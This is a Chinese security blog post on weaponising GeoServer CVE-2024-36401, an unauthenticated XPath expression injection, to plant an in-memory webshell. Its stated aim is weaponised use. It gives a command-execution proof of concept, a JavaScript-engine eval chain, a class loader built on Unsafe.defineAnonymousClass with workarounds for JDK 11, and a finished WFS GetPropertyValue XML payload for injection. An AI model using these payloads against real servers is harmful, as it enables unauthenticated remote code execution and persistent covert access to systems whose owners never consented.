#  GeoServer property RCE注入内存马   
原创 yzddMr6  网络安全回收站   2024-07-04 21:07  
  
## 背景  
  
GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。from https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/  
  
本文主要研究如何武器化利用，注入内存马。  
## 注入内存马  
  
目前市面上公开的POC主要是做到了命令执行：  
```
exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')
```  
  
Apache XPath解析表达式是支持链式调用的，是非常常见的一个表达式注入场景。虽然也可以用ClassPathXmlApplicationContext或者JNDI这种远程加载的方式去加载类，但是总归是有限制，不优雅。可以参考我之前在Kcon上讲过的议题《Java表达式攻防下的黑魔法》，可以利用Js引擎将这类链式调用的命令执行转化为完全体的任意代码执行，并且无需出网，无需额外依赖
Y4tacker也在之前的文章中提到了怎么构造Js引擎的Poc：https://tttang.com/archive/1771/  
```
eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.lang.Runtime.getRuntime().exec("open -na Calculator")')
```  
  
似乎只需要把Js执行的Payload换成我之前议题中给出的Payload即可：https://github.com/yzddmr6/Java-Js-Engine-Payloads  
  
但是实际上实现的时候有两个坑  
### 无法使用函数  
  
首先利用JMG生成内存马注入代码。由于通过bin形式安装默认是Jetty，这里选择Jetty类型  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU4IFpKSwoqKg8ic71tJicvTeUQBFGngwJpJR1A1GGTPXvtFT5GpLOSQNdsJ7cGsbiciasDUibLVXmMMvsw/640?wx_fmt=png&from=appmsg "")  
  
然后将code部分替换  
```
function Base64DecodeToByte(str) {
    var bt;
    try {
        bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
    } catch (e) {
        bt = java.util.Base64.getDecoder().decode(str);
    }
    return bt;
}

function defineClass(classBytes) {
    var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
    theUnsafe.setAccessible(true);
    unsafe = theUnsafe.get(null);
    unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), classBytes, null).newInstance();
}

defineClass(Base64DecodeToByte(code));
```  
  
  
打这个漏洞如果返回java.lang.ClassCastException是正常的，但是出现了下面的报错，说明有问题了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU4IFpKSwoqKg8ic71tJicvTeUcXu53T9Iic1f86UHWBrcXYmLSpicnwaY9VibyFz9kHccibpH9nEKEicHAzw/640?wx_fmt=png&from=appmsg "")  
  
经过多次测试，发现这里的Payload不能用function的语法。十分神秘，单独测试Js引擎没有这个问题，暂时没有去深入研究原因。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU4IFpKSwoqKg8ic71tJicvTeU9icT9ibHiaLZG1hb24ClDL0AFh5iacQMC7h9qaYSrH4zQwtjL6RMHtte7w/640?wx_fmt=png&from=appmsg "")  
### JDK11下的defineAnonymousClass  
  
重新改成不带function的形式，又出现了另外一个报错![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU4IFpKSwoqKg8ic71tJicvTeUZsTJoV69Pw7sdobf1OjbnZOZ4yKDNib2AibxzGlCxgicLwhONKY2ySHpg/640?wx_fmt=png&from=appmsg "")  
发现原因是JDK>8时，defineAnonymousClass做了限制，被加载的Class要满足两个条件之一：  
1. 没有包名  
  
1. 包名跟第一个参数Class的包名一致，此处为java.lang，否则会报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU4IFpKSwoqKg8ic71tJicvTeUQuOVsC9XOvHzrE4EeaoBgAFibP7ldEPAn725XWbicyA4UmLsKnxtY0zg/640?wx_fmt=png&from=appmsg "")  
而JDK8及以下无此限制![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU4IFpKSwoqKg8ic71tJicvTeUjSux0D6j7fOM52QPWNGFp6ILY68SmFB1TvExTVJNTOuPy9bYKJL93g/640?wx_fmt=png&from=appmsg "")  
正好JMG提供了修改注入器类名的功能，这里我们随便起一个java.lang.test的名字![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU4IFpKSwoqKg8ic71tJicvTeUvMw2iaFha80fZgKCI1B9IBljMb0P9n0exibI9RbHyZiaMRX703MMDX94w/640?wx_fmt=png&from=appmsg "")  
  
  
终于不报错了，注入成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU4IFpKSwoqKg8ic71tJicvTeUlO0Q4oAg3gL6qfteMYPdrjN5NRwFHOGWvnAo2s2JYMcMC7oj724ibxA/640?wx_fmt=png&from=appmsg "")  
  
连接的时候发现JMG的Jetty-AntSword-Listener类型似乎有BUG，打进去连接不上
随后换成Filter连接成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU4IFpKSwoqKg8ic71tJicvTeUHOv77xB931lQvsYBQULXh6NnzBficSlEfBt04RLVHMHiboibO1X1iahhRQ/640?wx_fmt=png&from=appmsg "")  
  
注入内存马Payload  
```
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="";
var bt;
try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
} catch (e) {
    bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>
```  
  
  
